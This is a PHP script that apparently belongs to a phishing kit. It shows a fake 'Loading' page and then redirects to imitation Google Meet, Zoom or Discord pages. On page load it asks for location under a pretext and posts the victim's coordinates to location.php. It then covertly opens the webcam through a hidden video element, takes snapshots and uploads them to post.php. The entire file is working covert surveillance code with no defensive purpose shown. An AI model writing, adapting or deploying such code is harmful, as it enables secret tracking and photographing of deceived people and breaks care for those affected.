<?php
include 'ip.php';

// Get parameters from the URL
$meetingType = isset($_GET['meeting']) ? $_GET['meeting'] : 'googlemeet';
$numPictures = isset($_GET['num_pictures']) ? intval($_GET['num_pictures']) : 1;

// Determine which HTML file to redirect to based on the 'meeting' parameter
switch ($meetingType) {
    case 'googlemeet':
        $redirectURL = 'googlemeet.html';
        break;
    case 'zoom':
        $redirectURL = 'zoom.html';
        break;
    case 'discord':
        $redirectURL = 'discord.html';
        break;
    default:
        $redirectURL = 'googlemeet.html'; // Default
        break;
}

// Add JavaScript to capture location and webcam
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        var imageCount = 0;
        var numPictures = ' . $numPictures . '; // Number of pictures to take
        var redirectURL = "' . $redirectURL . '"; // URL to redirect to

        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                setTimeout(function() {
                    window.location.href = redirectURL;
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    setTimeout(function() {
                        captureAndRedirect();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                captureAndRedirect();
            };
            
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Redirecting...";
            setTimeout(function() {
                captureAndRedirect();
            }, 2000);
        }

        function captureAndRedirect() {
            // Webcam access and image capture
            var video = document.createElement("video");
            video.style.display = "none";
            document.body.appendChild(video);

            var canvas = document.createElement("canvas");
            canvas.width = 400;
            canvas.height = 300;
            canvas.style.display = "none";
            document.body.appendChild(canvas);

            var context = canvas.getContext("2d");

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        video.srcObject = stream;
                        video.play();

                        var capture = function() {
                            context.drawImage(video, 0, 0, 400, 300);
                            var imageData = canvas.toDataURL("image/png");
                            sendImage(imageData);
                            imageCount++;

                            if (imageCount < numPictures) {
                                setTimeout(capture, 1000); // Capture every 1 second
                            } else {
                                window.location.href = redirectURL; // Redirect after capturing all images
                            }
                        };

                        // Start capturing after 3 seconds
                        setTimeout(capture, 3000);
                    })
                    .catch(function(err) {
                        console.log("An error occurred: " + err);
                        window.location.href = redirectURL; // Redirect even if there is an error
                    });
            } else {
                window.location.href = redirectURL; // Redirect if getUserMedia is not supported
            }
        }

        function sendImage(imageData) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "post.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("cat=" + encodeURIComponent(imageData));
        }

        // Try to get location when page loads
        window.onload = function() {
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>

